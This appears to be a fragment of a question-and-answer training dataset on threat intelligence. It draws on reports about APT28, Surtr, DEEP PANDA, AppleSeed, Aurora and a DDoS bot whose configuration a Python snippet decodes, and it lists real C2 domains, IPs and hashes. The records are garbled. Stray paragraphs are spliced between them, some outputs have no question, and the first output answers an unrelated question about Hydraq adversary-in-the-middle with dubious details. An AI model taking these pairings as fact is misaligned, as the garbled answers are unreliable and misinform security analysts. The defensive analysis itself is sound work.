resources that we have attributed to APT28 included Russian language settings (as opposed to neutral or English settings), suggesting that a significant portion of APT28 malware was compiled in a Russian language build environment consistently over the course of six years (2007 to 2013).\nOver 96% of the malware samples we have attributed to APT28 were compiled between Monday and Friday. More than 89% were compiled between 8AM and 6PM in the UTC+4 time zone, which parallels the working hours in Moscow and St. Petersburg.  These samples had compile dates ranging from mid-2007 to September 2014.\nThree themes in APT28's targeting clearly reflect areas of specific interest to an Eastern European government, most likely the Russian government.\nBig Headline: RUSSIAN INTERESTS\nMany of APT28's targets align generally with interests that are typical of any government.  However, three themes in APT28's targeting clearly reflects areas of specific interest to an Eastern European government, most likely the Russian government. These include the Caucasus (especially the Georgian government), Eastern European governments and militaries, and specific security organizations.\nAPT28 uses spearphishing emails to target its victims, a common tactic in which the threat group crafts its emails to mention specific topics (lures) relevant to recipients. This increases the likelihood that recipients will believe that the email is legitimate and will be interested in opening the message, opening any attached files, or clicking on a link in the body of the email. Since spearphishing lures are tailored to the recipients\nwhose accounts APT28 hopes to breach, the subjects of the lures provide clues as to APT28's targets and interests. For example, if the group's lures repeatedly refer to the Caucasus, then this most likely indicates that APT28 is trying to gain access to the accounts of individuals whose work pertains to the Caucasus. Similarly, APT28's practice of registering domains that mimic those of legitimate news, politics, or other websites indicates topics that are relevant to APT28's targets.\nWe identified three themes in APT28's lures and registered domains, which together are particularly relevant to the Russian government.\nIn addition to these themes, we have seen APT28 target a range of political and military organizations. We assess that the work of these organizations serves nation state governments.\n7 Bloomberg. \"Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.\" February 2014.\n8 Ibid.\n9 Ibid.\nAPT 28: Three Themes\nThe Caucasus, particularly the country of Georgia\nEastern European governments and militaries\nThe North Atlantic Treaty Organization (NATO) and other European security organizations\nRead the text above and answer this question: What are the three primary themes in APT28's targeting that align with the interests of an Eastern European government, and how do these themes manifest in the group's tactics?",

    "output": "Adversary-in-the-Middle (AiTM) is a technique used by attackers to position themselves between two or more networked devices, allowing them to intercept and manipulate network traffic. In the case of the Win32/Hydraq APT, it uses AiTM techniques to intercept and manipulate network traffic. Specifically, the APT uses Command 0x04 Task 0x02 to open or execute a file or program, and Command 0x04 Task 0x08 to update network.ics content, which allows it to manipulate the routing table and redirect traffic to the compromised system. This enables the attacker to perform a man-in-the-middle attack, where they can intercept traffic and capture information. Additionally, the APT's ability to adjust token privileges and escalate privileges allows it to maintain its position in the network and continue to intercept and manipulate traffic. Furthermore, the APT's use of encryption and custom protocols makes it difficult to detect and analyze its network activity, making it an effective AiTM attack.",

    "instruction": "Big Headline: Delivery Mechanism\nWhile the malicious attachments appear to be DOC files due to their file extension, they are actually RTFs crafted to exploit a vulnerability in Microsoft Word: CVE-2012-0158.\nThis particular vulnerability was first exploited in early April 2012 and a patch was released by Microsoft on April 10, 2012. Currently, the sample is detected as malicious by 34 percent of antivirus (AV) engines on VirusTotal (VT).\nThe malicious attachment is created using a shared template that we have seen used against multiple Tibetan groups. This template was created in March 2013 and, instead of specifically using the vulnerable ActiveX controls described in the vulnerability description, it utilizes the Chartspace Office Web Component. This component either suffers from the same vulnerability or uses one of the named ActiveX controls resulting in the attacker being able to execute malicious code.\nFigure 1: Hexdump of the malicious attachment\nAlthough CVE-2012-0158 was first published and used in the wild in April 2012, samples using this template were only initially detected by three AV engines (on VT). Therefore, while a third of AV engines had a detection signature for CVE-2012-0158 as late as April 2013, it was possible to design a document using a year old vulnerability that was recognized as malicious by very few AV products. This number has since risen and it is currently being detected by 34 percent of the AV products listed on VT.\nThis vulnerability highlights the need to keep both operating systems and applications up to date as well as to exercise vigilance concerning links and email attachments.\nMalicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file directory.\nBig Headline: Payload\nSurtr creates either a new explorer or iexplore process and injects itself into this new process using CreateRemoteThread function.\nIt also creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/123\n%ALL USERS%/Application Data/Microsoft/Windows/Burn\n%ALL USERS%/Application Data/Microsoft/Windows/LiveUpdata_Mem\nIt creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders. The copy in the Burn folder is called [VICTIM COMPUTER NAME].dll and there are three copies in the LiveUpdata_Mem folder whose names consist of 6 random alphanumeric characters which are then appended with .dll, _Fra.dll and _One.dll. These copies will differ from the original payload dropped in the %TEMP% folder by filling the resource section with varying amounts of 00 bytes. This also results in the malware having a much larger file size (30-50mb) possibly in an attempt to evade antivirus heuristics.\nSurtr connects to a command and control server (C2) and downloads a stage two component to %ALL USERS%/Application Data/Microsoft/Windows/Burn/_[VICTIM COMPUTER NAME].log. This particular sample connects to internet.3-a.net on port 9696.\nIn May 2012, internet.3-a.net resolved to the same IP (184.82.123.143) as android.uyghur.dnsd.me, which is a C2 used in Android malware attacks that targeted the Tibetan community as previously documented by the Citizen Lab.\nThe stage two component that was downloaded in this particular case has an internal name of x86_GmRemote.dll, however we have seen an alternate stage two used with the name Remote.dll as well. Our analysis in this post focuses on the GmRemote variation as it has been seen in multiple attacks.\nSurtr's capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine, viewing web cache, executing remote commands and logging keystrokes.\nIn order to store temporary information, Surtr creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/MpCache\n%ALL USERS%/Application Data/Microsoft/Windows/nView_DiskLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_KeyLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_skins\n%ALL USERS%/Application Data/Microsoft/Windows/UsbLoydb\nFor example, in nView_DiskLoydb, a file called FileList.db that contains file and directory listings will be placed and nView_KeyLoydb will contain text files with keylogger output. The keylogger output is disguised by adding a constant to the ordinal value of the character.\nThis data can then be sent to the C2. It is compressed using zlib DEFLATE so the network traffic is not human readable without decompression.\nIt can also download additional malware onto the victim computer, which can provide attackers with further abilities like accessing the victim computer's webcam or microphone. In particular, we have seen Surtr used in conjunction with the Gh0st RAT derived LURK0 malware.\nFor persistency, Surtr adds a key to the registry to ensure it runs when the infected computer is restarted. It also stores its C2 information and a campaign code in the registry.\nDepending on the configuration, Surtr will either create multiple registry keys in Software\\Microsoft\\Windows Media in HKU (hkey users) with text data or a single key called XC consisting of binary data. These are usually xor encrypted with a key of 0\u00d71.\nFigure 2: Encrypted data in XC key\nBig Headline: Other Samples & Variations\nWe have seen a large number of similar samples sent to Tibetan groups that use the same stage two (GmRemote) and communicate with the following C2s: dtl.dnsd.me, dtl.eatuo.com, dtl6.mooo.com and tbwm.wlyf.org. These C2s were also used in previous attacks documented in an earlier Citizen Lab post on LURK0 malware targeting the Tibetan community.\nOne particular sample (md5: ad9e5f79585eb62bc40b737e98bfd62e) which connects to C2 domain dtl6.mooo.com (which resolved to the same IP as the other dtl domains mentioned above) on port 6178 was seen to download LURK0 malware after the initial Surtr infection. This LURK0 sample had the campaign code ZQ6 that connects to C2 domain tbwm.wlyf.org on port 3103. This domain also resolved to the same IP as the dtl domains.\nWe have also found reports of other Surtr stage 2 (GmRemote) samples that have campaign codes which suggest they may be targeted at commercial and government targets.\nThe first sample was found via ThreatExpert. It uses campaign code kmlg-0308, and connects to a C2 at flyoutside.com. This domain and eight others are registered to toucan6712@163.com:\nSearching for more samples in Virus Total Intelligence (VTI) using domains and other identifying features reveals four related files:\n7fbdd7cb8b46291e944fcecd5f97d135 \u2013 connects to C2 domain www.flyoutside.com, campaign code kmlg-0409tb\n58ff38412ebbedb611a3afe4b3dbd8b0 \u2013 connects to C2 IP 112.121.182.149 (similar to above), campaign code lly-0311\n81bc8974967e1c911b107a9a91e3178b \u2013 connects to C2 domain www.paulfrank166.2waky.com (192.198.85.102), campaign code 0201-2116\n44758b9a7a6cafd1b8d1bd4c773a2577 \u2013 connects to C2 domain www.flyoutside.com (same as the first sample found on ThreatExpert), campaign code lg-0109\nMost of these samples have campaign codes that suggest commercial targets. However, we do not have information about where these samples were submitted from, so the target sector and victims cannot be confirmed.\nA second GmRemote sample was found via the web, called Trojan/Subxe.89E1 by Anchiva. This sample connects to google.djkcc.com and uses campaign code in1102. Other subdomains under djkcc.com include:\nairforce.djkcc.com\ndomain.djkcc.com\ngoogle.djkcc.com\nindianembassy.djkcc.com\nmailnic.djkcc.com (MailNIC is an Indian email site at the National Informatics Centre)\nmicrosoft.djkcc.com\nrediffmail.djkcc.com (Rediffmail is an Indian email site)\nWhile we do not have information about what victims these samples target, the campaign code, C2 domain, and related subdomains give some possible indications.\nOne additional find via VTI is a GmRemote sample internally named: GmKeyBoradServer_DLL.dll (MD5 e7e1c69496ad7cf093945d3380a2c6f4).\nIt exports functions (GmFunctionType, GmInitPoint, GmMyInitPoint, GmRecvPoint, GmShutPoint, GmVerSion) that are referenced in other GmRemote samples, although none of them have any real content.\nThese additional samples suggest that Surtr is being used to target groups beyond the Tibetan community and is possibly being utilized by multiple threat actors.\nRead the text above and answer this question: How does the Surtr malware exploit the CVE-2012-0158 vulnerability in Microsoft Word, and why might this approach be effective even though the vulnerability was patched over a year before the attack?",
    "output": "The Surtr malware exploits the CVE-2012-0158 vulnerability by utilizing a shared template that employs the Chartspace Office Web Component, which either suffers from the same vulnerability or uses one of the named ActiveX controls, allowing the attacker to execute malicious code. This approach is effective because, despite the vulnerability being patched in April 2012, the specific template used in the attack was only initially detected by three antivirus engines on VirusTotal. This highlights that even year-old vulnerabilities can be exploited if the attack is designed in a way that evades most antivirus detections.",

Known targets include governmental institutions, military contractors, maritime and shipbuilding groups, telecom operators, industrial and high-tech companies and mass media.\nThe name \"Icefog\" comes from a string used in the command-and-control server name in one of the samples. The command-and-control software is named \"Dagger Three\", in the Chinese language.\nThe \"Icefog\" backdoor set (also known as \"Fucobha\") is an interactive espionage tool that is directly controlled by the attackers. There are versions for both Microsoft Windows and Mac OS X. In its latest incarnation, Icefog doesn't automatically exfiltrate data, instead, it is operated by the attackers to perform actions directly on the victim's live systems.\nDuring Icefog attacks, several other malicious tools and backdoors were uploaded to the victims' machines, for data exfiltration and lateral movement. This document includes a description of the backdoors, other malicious tools, together with remediation information.

    "instruction": "I am Ironman: DEEP PANDA Uses Sakula Malware to Target Organizations in Multiple Sectors\nOver the last few months, the CrowdStrike Intelligence team has been tracking a campaign of highly targeted events focused on entities in the U.S. Defense Industrial Base (DIB), healthcare, government, and technology sectors. This campaign infected victims with Sakula malware variants that were signed with stolen certificates. Investigation into this activity led to associations with the adversary known to CrowdStrike as DEEP PANDA.\nOn 31 July 2014, an executable was identified, which, at the time, was not detected by any anti-virus products. When this file was executed, it caused the victim to view a website by using the ShellExecute() API to open a URL. The site's domain name was meant to spoof that of a site set up to provide information on an alumni event for a U.S university. This page requested that the visitor download an Adobe-related plugin in order to view the content. The downloaded plugin file included a variant of Sakula malware. [1]\nThe Sakula malware in this campaign utilized the Dynamic Link Library (DLL) side-loading technique most commonly associated with PlugX activity. In the aforementioned university-related incidents, a legitimate executable named MediaSoft.exe (MD5 hash: d00b3169f45e74bb22a1cd684341b14a) loaded a file named msi.dll (MD5 hash: ae6f33f6cdc25dc4bda24b2bccff79fe), which, in turn, was used to load the Sakula executable (MD5 hash: 0c2674c3a97c53082187d930efb645c2). This final executable was also signed with a certificate assigned to an organization called DTOPTOOLZ Co., Ltd.\nCommand-and-Control (C2) communications in this incident went directly to IP address 180.210.206.246; a sample GET request is below:\nFurther investigation revealed similar activity stretching back to at least April 2014, when similar TTPs were used to target a healthcare organization and a U.S.-based IT company with high-profile clients in the defense sector. Two other incidents were also identified in August 2014 targeting a company in the DIB and a Mongolian government entity.\nAll incidents in this campaign were similar in that they utilized malicious droppers masquerading as installers for legitimate software applications like Adobe Reader, Juniper VPN, and Microsoft ActiveX Control. They display progress bars that make it appear as if the specified software is being updated or installed.\nExample of Installer Progress Bar Displayed by Dropper\nIn addition, the droppers all directed victims to login pages for services specific to the target organization like webmail, document sharing, or corporate VPN. In all cases except one, the victims were directed to legitimate login pages. The one exception was a case in which victims were sent to a login page hosted on a domain that spoofed that of the legitimate one. It is unclear whether redirecting victims to these login pages was part of credential-collection activity or merely meant to deceive victims into believing that the activity was legitimate.\nExample of a Login Page that Victims were Redirected to\nThe campaign appeared to be over by the end of August, but a file was recently discovered that suggests it may be ongoing. The intended target again appeared to be a Mongolian government entity, and the file masqueraded as an installer for Microsoft ActiveX software. It dropped the side-loaded Sakula malware just like in the other incidents; however, in this instance, the Sakula payload was signed with a certificate assigned to a different organization, Career Credit Co., Ltd. The malware used the domain www[.]xha-mster[.]com for C2 which was created in mid-September and is registered with the email address wendellom@yahoo.com and registrant name \"tonyy starke\" (hence the name, Ironman-related title for this blog).\nBelow is a chart showing the relevant relationships to this DEEP PANDA campaign.\nThe bottom of the chart shows an infrastructure connection between an IP address (198.200.45.112) used this campaign and also used in recently observed DEEP PANDA activity.\nQ: How did DEEP PANDA utilize spoofed websites and login pages to potentially collect credentials or deceive victims during their campaign, and what role did these tactics play in the overall strategy?",
    "output": "DEEP PANDA utilized spoofed websites and login pages to potentially collect credentials or deceive victims by directing them to fake or legitimate login pages specific to the target organization, such as webmail, document sharing, or corporate VPN services. In one instance, victims were sent to a login page hosted on a domain that spoofed a legitimate one. This tactic played a crucial role in the overall strategy by either collecting user credentials if the login page was fake or by deceiving victims into believing that the activity was legitimate if they were directed to actual login pages. This approach helped DEEP PANDA maintain the illusion of legitimacy while potentially gaining access to sensitive information or systems within the targeted organizations.",

    "output": "A Trojan Horse is a type of malware that appears to be benign or useful but actually contains hidden code that violates the intended security policy of the user or system administrator. In the context of APTs like the SEA, Trojan Horses are often used to compromise targets through socially engineered spear-phishing emails. These emails lure opposition activists into opening fraudulent, weaponized, and malicious documents that install remote access tool (RAT) software on the victim's computer. This software can give the attacker keystrokes, screenshots, microphone and webcam recordings, stolen documents, and passwords, which are then sent to a computer address controlled by the SEA for intelligence collection and review. The implications of such attacks are significant, as they can give the attackers access to sensitive information and allow them to target political activists for espionage, intimidation, and arrest. Furthermore, the use of Trojan Horses by APTs like the SEA highlights the importance of robust cybersecurity measures, including employee education and awareness, to prevent such attacks.",

    "output": "The use of a freely-available open-source backdoor in the latest wave of cyberattacks against the Ukrainian power industry raised questions about the perpetrators because it deviated significantly from the sophisticated and allegedly state-sponsored BlackEnergy malware used in previous attacks. This shift suggests that either the attackers changed their tactics to avoid detection or that different actors might be involved. The choice of an open-source tool, which is less expected from advanced and well-resourced adversaries, adds complexity to the attribution process and challenges traditional assumptions about the capabilities and motivations of the attackers.",

They can then steal passwords and gather information about the device to send to the attacker. The Simda.AT variant first appeared in 2012, and is often downloaded to a vulnerable device by a drive-by download. Aside from the information-stealing behavior common to Simda variants, Simda.AT redirects search traffic from popular websites such as Bing, Google, and Facebook to its own domain, and can download other malware from a remote host. Simda was the 55th most commonly encountered malware family worldwide in 1H15, with the overwhelming majority of encounters involving the Simda.AT variant.\nFigure 48.

    "instruction": "Small Headline: 3.1.4. Thread\nAppleSeed executes thPingCmd which works as the main thread. The thread simply executes two threads in the span of 60 seconds. The first thread is named sendHttpPing, which periodically communicates with the C&C server to maintain connection. The second thread is named dropAndRunCmd and performs malicious behaviors by receiving commands from the server.\nThe following table shows the URLs used by AppleSeed to communicate with the C&C server.\n\"m\" seems to mean \"mode,\" with \"a\" being used for \"ping\", \"b\" for \"commands\", \"c\" for \"downloading commands\", and \"d\" for \"completing downloading commands\". These are all the URLs used in the sample,\nbut more types of URLs are used for the sample with the info-stealing feature enabled, and they will be discussed later when the sample is analyzed.\nSmall Headline: a. sendHttpPing Thread\nThe sendHttpPing thread is excuted every 60 seconds, sending the basic information of the infected system to the C&C server. Unlike other communication instances where only the PcID is sent, this thread also sends PcInfo and the malware version like the URL shown below.\nThe PcID used in this case combines the volume serial number and the user name such as \"888a15a5testUser.\" PcInfo is a bit more complicated. It is a string that appears to show the Windows version (Major, Minor, and Build) as well as the architecture and the malware version. The malware version is the string \"D_Regsvr32\" that was obtained during the decoding process for previous settings data and the string that was decoded in the current thread 2.0 and 7.\nThe information is ultimately sent to the C&C server with the following URL:\nSmall Headline: b. dropAndRunCmd Thread\nThis thread performs commands that it has received. After requesting the C&C server to send commands, it downloads and decrypts them to perform malicious behaviors, then sends back the result.\nIt accesses the C&C server using the URL \"/?m=c&p1=[PcID]\" and downloads the data that includes commands. The User-Agent string used in the process is as follows:\nThe downloaded data is saved as a file in the %ALLUSERSPROFILE%\\temp\\ path. Unlike average malware strains, AppleSeed saves features that can be processed within the memory as a file. So for every stage, such as downloading commands and unpacking and decrypting files, all the results are saved in the %ALLUSERSPROFILE%\\temp\\ path.\nWhen the download is finished, the malware accesses the C&C server via the URL \"/?m=d&p1=[PcID]\" to inform the server that the process has been completed. It is currently not possible to access the server, but it appears that the downloaded data starts with the \"%PDF-1.7..4 0 obj\" signature. AppleSeed begins the unpacking process after scanning the signature.\nThe decryption process follows when the unpacking process is complete. The unpacked data includes the RC4 key encrypted with the RSA public key and the data encrypted with the RC4 key. The malware first decrypts the data saved in the 0x80 size after +0x04 using the RSA (1024) private key included in the binary and obtains the RC4 key based on the data. Then it decrypts the data with the RC4 key to have the command data.\nWhile the command data is not available for download at this moment, it appears that the unpacked data will have the following format based on the uploading process that will be discussed later in this report.\nThe following table is a list of commands that the current analysis target, AppleSeed, can perform. The command names are based on the string confirmed through the debug message.\nUnlike the MemDLL command that loads and executes malware within the memory, DLL and UpdateDLL command download DLL in the file form and execute it with the \"regsvr32.exe /s\" command. They are divided into two commands (DLL, UpdateDLL) which are essentially the same.\nAs for the CMD command, it executes the command line that was sent and receives the result through a pipe to save it in the %ALLUSERSPROFILE%\\temp\\ path. It then additionally encrypts the saved file before sending it like zip compression or the encryption process discussed above. The command first creates a random RC4 key and encrypts the zip compression file with the RC4 algorithm. The randomly created RC4 key is encrypted with the public key included in the binary. The final data after the encoding process is as follows:\nThe compressed and encrypted data is attached to the POST request and sent as the following URL:\nMedium Headline: 3.2. Analysis of Info-stealing Feature\nWhile the sample discussed earlier is a simple malware without the info-stealing feature, the same cannot be said for other AppleSeed samples. Those with functional info-stealing feature can receive additional commands from the C&C server and perform them. The following table provides an overview on the info-stealing feature and routines for performing additional commands.\nAppleSeed samples with functional info-stealing feature use more URLs than those mentioned above.\nThe following shows the entire URLs used with an explanation for each case.\nSmall Headline: 3.2.1. Information Theft\nStarting from the installation, the sample proves that it's different by creating the flags folder and flag files before copying and running the file in the installation path. Each flag file contains a Unicode string \"flag.\" At the info-stealing routine, the sample checks each flag and steals information from each existing flag. The stolen data is then sent to the C&C server after being encrypted and compressed with zip.\nSmall Headline: a. Setting Target Files to be Stolen\nBesides 4 monitor threads, AppleSeed has an additional thread that was not mentioned earlier. It periodically reads the \"list.fdb\" file that exists in the installation path, and if the file contains the pathname of a certain file, it compresses and encrypts the file in the path to send it to the C&C server. The d command writes the received pathname into the \"list.fdb\" file, and if the attacker wishes to steal a certain file, they can send the file path through the d command to upload it to their server.\nThe URL used to upload files from the thread is the same as the one that is used to steal document files and USB drive file list as shown below.\nSmall Headline: c. Downloading Files\nA command for downloading files to create the received data in a certain path.\n3.3. C&C Communication Using Emails\nIn terms of overall features, AppleSeed samples that use email for C&C communications are not much different from the sample discussed in the \"3.1 Analysis of Default Features\" in this report. However, one difference is that the samples use email protocols instead of HTTP during the C&C communications process. As such, the C&C communications via emails will be analyzed in detail.\nLike the sample with default features from the \"3.1.4. Thread\" part, AppleSeed utilizing email creates 2 main threads. They can be categorized as Ping thread and Command thread respectively, using email protocol to communicate with the C&C server. The email address and password of the attacker are encoded and saved within the file.\nThe attacker used the curl open source 2 to communicate with the C&C server using an email. The 2 main threads created by the Email AppleSeed sample can be divided into a thread that uses the IMAP protocol and a thread that uses the SMTP protocol based on their roles. The Ping thread defined in the \"3.1. \"Analysis of Default Features\" part uses the SMTP protocol as its role is to send the information of the current system to the attacker's email. The Command thread uses the IMAP protocol since it receives additional malicious data from the attacker's email.\n2\nSmall Headline: 3.3.2. Command Thread (IMAP)\nThis thread is executed every 30 seconds. It checks if there is an email mailbox named \"cmd\" in the attacker's email account and downloads additional malware through the email's attachments. As the attacker's email account cannot currently be accessed, it is not certain what types of malicious files exist. \"5. Post Infection\" section of this report will discuss additionally installed malware strains identified by AhnLab ASD infrastructure.\nThe attacker uses the IMAP feature of the curl open source to download additional malware from the email server. After going through the IMAP reset process, the thread sends the \"select cmd\" command to check if the mailbox named \"cmd\" exists.\nIf the mailbox named \"cmd\" exists, the thread saves the attached file in the %ALLUSERSPROFILE%\\temp path with the name [random 4 characters].tmp after going through the parsing process.\nAfter saving the attached file in the %ALLUSERSPROFILE%\\temp path, the sample uses the \"STORE 1 +Flags \\Deleted\" command to delete the email with the attached file from the mailbox. The process for unpacking and decrypting the file is the same as the content of the dropAndRunCmd thread explained in \"3.1 Analysis of Default Features.\" This means that the sample can perform 4 commands: CMD, DLL, MemDLL, and UpdateDLL.\n\nHow does AppleSeed handle the theft of specific files from an infected system, and what mechanisms does it use to upload these files to the C&C server?",
    "output": "A: AppleSeed has an additional thread that periodically reads a 'list.fdb' file located in the installation path. If this file contains the pathname of a specific file, the malware compresses and encrypts that file and sends it to the C&C server. The 'd' command is used to write the received pathname into the 'list.fdb' file, allowing the attacker to specify which files to steal. The stolen files are uploaded using the same URL that is used to steal document files and USB drive file lists. This mechanism allows the attacker to exfiltrate sensitive data from the infected system.",

How does Dimnie, the malware discussed in the report, maintain stealth and evade detection over the years? Describe the key factors contributing to its longevity.",
    "output": "Dimnie maintains its stealth and evades detection through several key factors. Firstly, it employs stealthy command and control methods, which are designed to be difficult to detect. Secondly, its modular design allows it to inject various information-stealing functionalities into the memory of core Windows processes, complicating analysis efforts. Additionally, Dimnie has undergone few changes over the years, which helps it remain under the radar. Its previously Russian-focused target base has also contributed to its ability to fly under the radar until recently.",

    "instruction": "Context: Medium Headline: Malware Summary of Findings and Analysis\nThe predecessor Aurora malware comes from two different families. The newer family came immediately 2 months after the older family, and there was no overlap in their prevalence. For the older family, there was neither an observable protection mechanism nor an AV evasion technique. It was simply a dropper for keylogger files. The newer family has some protection mechanisms and AV evasion techniques. However, it lacks the sophistication found in other botnet malware families.\nBelow is a summary of the findings of the two malware families that were analyzed.\nCommon characteristics:\n1. Served through fake AV hosting Web sites (no longer available)\n2. Common autostart techniques\n3. Common older stealth techniques\n4. Multiple malware server domains to improve resiliency\n5. Droppers and dropped files (EXE and DLLs) were compiled using Microsoft compilers\nDifferences:\n1. Main malware component:\na. November 2009 Family \u2013 uses DLL file as one of its components\nb. August 2009 Family \u2013 uses VXD and SYS files\n2. Main function:\na. November 2009 Family \u2013 pop-up ads\nb. August 2009 Family \u2013 Suspected keylogger (actual files are no longer available for analysis)\n3. Protection Mechanism:\na. November 2009 Family \u2013 uses basic protection mechanisms to hide itself\nb. August 2009 Family \u2013 none observed\nComparing them to Trojan.Hydraq:\n1. Code obfuscation\n\u2022 Trojan.Hydraq uses \"spaghetti code\" in which program elements are separated into small chunks and connected via jump instructions. This technique complicates following the code, and is similar to the tactics employed in old PE viruses that write to small spaces in the host and connect themselves through jump instructions.\n\u2022 November 2009 Family \u2013 Does not use any code obfuscation. One dropped file is actually packed using FSG v1.33.\n\u2022 August 2009 Family \u2013 None observed.\n2. Autostart Technique\n\u2022 Trojan.Hydraq uses Svchost process in Windows by adding its service name in \"netsvcs\". When Windows starts, it will load the service into memory.\n\u2022 November 2009 Family \u2013 Uses common autostart technique using the \"Run\"key.\n\u2022 August 2009 Family \u2013 Uses common autostart technique using the \"Run\" key.\n3. Intent / Payload\n\u2022 Trojan.Hydraq \u2013 Information gathering\n\u2022 November 2009 Family \u2013 Pops up ads and Web site redirector\n\u2022 August 2009 Family \u2013 Information gathering\nMedium Headline: Malware Significance\nBasing on the profile of the two malware families that were analyzed, they are obviously different from each other. The key thing they have in common is that the CnC they utilize are publicly associated with the Aurora botnet.\nThe botnet controllers preyed on the fear of users that their system is infected with malware. This method saves the botnet controllers from the technical complexity of bypassing Windows' UAC by using the weakest link in host security \u2013 which is the user. The misled user typically clicks OK to everything, bypassing UAC and giving the malware dropper explicit permission to execute.\nNeither of the malware predecessor families exhibit the sophistication found in newer malware. Some of the evasion techniques are almost a decade old. Both families use two sets of domains: one for serving malware and the other for CnC.\nThe droppers and dropped files were compiled using Microsoft Compilers. This is evidenced by the presence of the string \"Rich\" before the PE header. This watermark is undocumented, meaning there is no mention of this watermark from Microsoft references but they are present in binaries compiled using Microsoft Compilers. Knowing the compiler of choice might help investigators narrow down the individuals or group of individuals responsible for the code.\nThe simplicity and relative obsolescence of the early versions of the Aurora malware suggest that these malware families were created or written by an individual or group of individuals new to the production of commercial grade malware. Based solely on these families of malwares, it also appears that different individuals or group of individuals created the code:\n\u2022 The only association the different families have with each other is that they used CnCs associated with Operation Aurora, and they were distributed via similar means. That said, it is possible that two different groups purchased the services of the same crimeware group (probably the same people behind Operation Aurora) to distribute and manage their malware family. Or the crimeware group rented out different variants of the same malware to different groups with different intentions. Price may also be a factor. The less resilient the malware family is, the cheaper it is to purchase or rent.\n\u2022 The intent of each malware family is different.\n\u2022 There is no natural progression seen between the two families. Usually malware writers evolve in both technology and protection of their creation but these two families did not show any related evolution. The malware families appear to exist independently, and then become superseded by Trojan.Hydraq.\nBig Headline: Piecing it Together\nDamballa analyzed network DNS information from a number of distinct and complementary sources ranging from global monitoring systems, enterprise monitoring sensors, passive DNS resolution data\nand other DNS streams for this report. At the same time, Damballa also analyzed the malware commonly associated with the Aurora attacks disclosed by Google in January. The result has been a definite correlation between key CnC channels with other malware families that are associated with the criminal operators behind the Aurora botnet.\nBased upon our analysis of this attack and the surrounding evidence currently available, we classify the attacks against Google and the other previously identified victim organizations as being typical of current botnet criminal practices. The attack is most notable not for its advanced use of an Internet Explorer 6 Zero-Day exploit, but rather for its unsophisticated design and a pedigree that points to a fast-learning but nevertheless amateur criminal botnet team.\nMedium Headline: DDNS Findings Summary\nBased upon Damballas investigation of DDNS data, the key findings are as follows:\n1. The botnet has a simple command topology and makes extensive use of DDNS CnC techniques. The construction of the botnet would be classed as \"old-school\", and is rarely used by professional botnet criminal operators any more. However, such reliance upon DDNS CnC is commonly associated with new and amateur botnet operators\n2. There were several CnC domains were identified based upon key characteristics of the registration and management of the previously publicly disclosed CnC domains.\n3. The major pattern of attacks in mid-December appear to have their origin in July 2009 in mainland China. This likely corresponds to early testing of the botnet CnC.\n4. Some of the infections appeared to start within Google's network. Some of apparent botnet the traffic is not consistent with an IE6/WinXP infection and cannot be easily explained.\n5. The attackers had access to large numbers of CnC hosts in geographically diverse hosting co-locations \u2013 certainly a high number for a botnet. Further, the botnet used over a dozen domains in diverse DDNS networks for CnC.\n6. Only the US victims were compelled to perform MX queries, an event that would typically indicate attempted document exfiltration via email services.\n7. Some of the botnets focused on victims outside of Google, suggesting that each domain might have been dedicated to a distinct class or vertical of victims.\n8. A review of the TTL period suggests that botmasters de-registered their domains around December 18, 2009.\nMedium Headline: Passive DNS Data Summary\nBased upon analysis of DNS resolution data gathered through a global network of passive DNS monitoring sensors, the key findings are as follows:\n1. Cumulative volume of CnC domain name resolutions provides adequate sampling to identify the initialization and growth phases of the Aurora botnet, which also reveals active operation of the CnC channels dating back to June 14th 2009.\n2. The victim's computers connected to, or were part of, 64 different networks, based upon Autonomous Systems (AS) breakdown of Internet netblocks which could represent the upper bound of organizations that may have been breached in the larger Aurora attack. Some organizations (such as Google) own and manage several AS networks. Some of the other AS networks were associated with public Internet Service Providers, which may encompass multiple small and medium businesses.\n3. The various CnC domains used by the criminal botnet operators peaked at different times with different rates of lookup by victim systems. These observations correspond to different campaigns run in parallel by different botnet operators and represent the widely publicized attacks that appeared to make use of the Internet Explorer 6 Zero-Day exploit. It is a common tactic by botnet operators to run multiple campaigns at the same time, using different infection vectors (e.g. drive-by downloads, FakeAV, USB infections, etc.) over extended periods of time. This strategy is very consistent with APT campaign methodologies.\n4. The vast majority of victim systems appear to have been based in the United States.\n5. It is possible to identify the various CnC testing, deployment, management and shutdown phases of the Aurora botnet CnC channels. Some of the CnC domains appear to have been dormant for a period of time after they had infected number victim systems. This type of activity can sometimes be associated with an update to the botnet malware or if the criminal operator sells/trades a segment of the botnet to another criminal operator.\nAnswer this question: What insights can be gained from the analysis of passive DNS data regarding the Aurora botnet's operations and victim distribution? How does this align with APT campaign methodologies?",
    "output": "The analysis of passive DNS data revealed several key insights about the Aurora botnet's operations and victim distribution. The cumulative volume of CnC domain name resolutions showed the initialization and growth phases of the botnet, with active operation dating back to June 14th, 2009. Victims were connected to 64 different networks, with the majority based in the United States. Different CnC domains peaked at different times, corresponding to parallel campaigns run by different botnet operators. This strategy aligns with APT campaign methodologies, where multiple infection vectors are used over extended periods to maximize impact and evade detection.",

How does this process work, and what information does the decoded configuration contain?",
    "output": "A: The configuration file issued by the DDoS C2 servers in Operation Poisoned Handover is encoded using base64 and XOR encoding. To decode it, first strip the leading and trailing '@$@' characters. Then, perform a base64 decode followed by an XOR decode using one of two possible single-byte XOR keys (0x2A or 0x7E). The provided Python code snippet demonstrates this process: `b64encoded = request.content.rstrip('@$@').lstrip('@$@'); b64decoded = b64encoded.decode('base64'); for c in b64decoded: x = ord(c); x = x ^ XOR_key; command += chr(x)`. The decoded configuration contains sections like [KernelSetting], [UpdateServer], [DDOS_HostStatistics], and various DDoS attack configurations such as [DDOS_ScriptFlood], [DDOS_UdpFlood], [DDOS_SynFlood], and [DDOS_TcpFlood]. These sections specify settings for reporting state, downloading files, updating the bot, and configuring different types of DDoS attacks, including target URLs, ports, and timing parameters.",

